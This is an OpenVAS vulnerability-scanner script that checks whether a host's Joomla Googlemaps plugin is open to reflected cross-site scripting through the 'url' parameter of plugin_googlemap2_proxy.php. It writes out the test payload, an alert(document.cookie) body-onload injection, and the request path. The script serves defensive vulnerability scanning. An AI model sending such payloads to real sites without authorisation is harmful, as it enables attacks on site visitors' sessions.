###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_googlemaps_mult_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Joomla Googlemaps Multiple Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "
  Impact Level: Application";
SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803836";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-07-22 15:14:31 +0530 (Mon, 22 Jul 2013)");
  script_name("Joomla Googlemaps Multiple Vulnerabilities");

  tag_summary =
"This host is running Joomla Googlemaps plugin and is prone to multiple
vulnerabilities.";

  tag_vuldetect =
"Send a crafted data via HTTP GET request and check whether it is vulnerable
or not.";

  tag_insight =
"Input passed via 'url' parameter to 'plugin_googlemap2_proxy.php'
is not properly sanitised before being returned to the user.";

  tag_impact =
"Successful exploitation will allow remote attacker to execute arbitrary
HTML or script code, discloses the software's installation path resulting in a
loss of confidentiality.";

  tag_affected =
"Googlemaps plugin for Joomla versions 2.x and 3.x and potentially
previous versions may also be affected";

  tag_solution =
"No solution or patch is available as of 22nd Jul, 2013. Information
regarding this issue will be updated once the solution details are available.
For updates refer to http://extensions.joomla.org/extensions/maps-a-weather/maps-a-locations/maps/1147";

  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "impact" , value : tag_impact);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://www.osvdb.com/95423");
  script_xref(name : "URL" , value : "http://www.osvdb.com/95424");
  script_xref(name : "URL" , value : "http://www.osvdb.com/95425");
  script_xref(name : "URL" , value : "http://www.osvdb.com/95426");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2013/Jul/158");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/joomla-googlemaps-xss-xml-injection-path-disclosure-dos");
  script_summary("Check if Joomla Googlemaps plugin is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("joomla/installed");
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
url = "";
dir = "";
port = "";

## Get HTTP Port
port = get_app_port(cpe:CPE, nvt:SCRIPT_OID);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port)){
  exit(0);
}

## Construct attack request
url = string(dir, "/plugins/content/plugin_googlemap2_proxy.php",
                  "?url=%3Cbody%20onload=alert(document.cookie)%3E");

## Check the response to confirm vulnerability
if(http_vuln_check(port:port, url:url, check_header:TRUE,
               pattern:"onload=alert\(document.cookie\)",
                     extra_check:"Couldn't resolve host"))
{
  security_hole(port);
  exit(0);
}
